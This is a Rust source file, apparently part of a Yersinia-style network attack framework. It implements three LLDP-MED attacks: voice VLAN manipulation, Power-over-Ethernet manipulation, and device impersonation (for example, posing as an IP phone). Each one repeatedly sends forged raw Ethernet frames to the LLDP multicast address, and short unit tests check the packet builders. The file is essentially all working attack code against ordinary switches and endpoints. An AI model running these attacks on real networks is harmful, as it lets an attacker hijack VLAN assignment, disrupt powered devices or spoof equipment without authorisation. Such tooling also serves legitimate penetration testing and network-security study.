//! LLDP-MED Attack Implementations
use super::packet::{LldpMedPacket, LldpMedTlv};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct VoiceVlanManipulationAttack {
    pub target_vlan: u16,
    pub priority: u8,
}

impl VoiceVlanManipulationAttack {
    pub fn new(vlan: u16) -> Self {
        Self {
            target_vlan: vlan,
            priority: 6, // Voice priority
        }
    }

    pub fn build_packet(&self) -> LldpMedPacket {
        LldpMedPacket::new(vec![0x00, 0x11, 0x22, 0x33, 0x44, 0x55], vec![0x01]).with_tlv(
            LldpMedTlv::network_policy(1, self.target_vlan, self.priority),
        )
    }
}

#[async_trait]
impl Attack for VoiceVlanManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30); // LLDP-MED standard interval

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let lldpmed_packet = self.build_packet();
            let lldpmed_bytes = lldpmed_packet.to_bytes();

            // LLDP uses multicast MAC 01:80:c2:00:00:0e
            let dst_mac = MacAddress([0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLDP, lldpmed_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending LLDP-MED voice VLAN packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "LLDP-MED Voice VLAN Manipulation"
    }
}

#[derive(Debug, Clone)]
pub struct PoEManipulationAttack {
    pub power_priority: u8,
    pub power_value: u16,
}

impl PoEManipulationAttack {
    pub fn new(power: u16) -> Self {
        Self {
            power_priority: 3, // High priority
            power_value: power,
        }
    }

    pub fn build_packet(&self) -> LldpMedPacket {
        LldpMedPacket::new(vec![0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF], vec![0x02]).with_tlv(
            LldpMedTlv::power_via_mdi(1, 1, self.power_priority, self.power_value),
        )
    }
}

#[async_trait]
impl Attack for PoEManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let lldpmed_packet = self.build_packet();
            let lldpmed_bytes = lldpmed_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLDP, lldpmed_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending LLDP-MED PoE packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "LLDP-MED PoE Manipulation"
    }
}

#[derive(Debug, Clone)]
pub struct DeviceImpersonationAttack {
    pub device_type: u8,
    pub capabilities: u16,
}

impl Default for DeviceImpersonationAttack {
    fn default() -> Self {
        Self::new()
    }
}

impl DeviceImpersonationAttack {
    pub fn new() -> Self {
        Self {
            device_type: 3,     // Network Connectivity Device
            capabilities: 0xFF, // All capabilities
        }
    }

    pub fn as_phone(mut self) -> Self {
        self.device_type = 1; // Endpoint Class I
        self.capabilities = 0x01; // LLDP-MED Capabilities
        self
    }

    pub fn build_packet(&self) -> LldpMedPacket {
        LldpMedPacket::new(vec![0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC], vec![0x03]).with_tlv(
            LldpMedTlv::capabilities(self.device_type, self.capabilities),
        )
    }
}

#[async_trait]
impl Attack for DeviceImpersonationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(30);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let lldpmed_packet = self.build_packet();
            let lldpmed_bytes = lldpmed_packet.to_bytes();

            let dst_mac = MacAddress([0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::LLDP, lldpmed_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending LLDP-MED device impersonation packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "LLDP-MED Device Impersonation"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_voice_vlan_manipulation() {
        let attack = VoiceVlanManipulationAttack::new(100);
        let pkt = attack.build_packet();
        assert_eq!(pkt.med_tlvs.len(), 1);
    }

    #[test]
    fn test_poe_manipulation() {
        let attack = PoEManipulationAttack::new(15400); // 15.4W
        let pkt = attack.build_packet();
        assert_eq!(pkt.med_tlvs.len(), 1);
    }

    #[test]
    fn test_device_impersonation() {
        let attack = DeviceImpersonationAttack::new().as_phone();
        let pkt = attack.build_packet();
        assert_eq!(pkt.med_tlvs.len(), 1);
    }
}
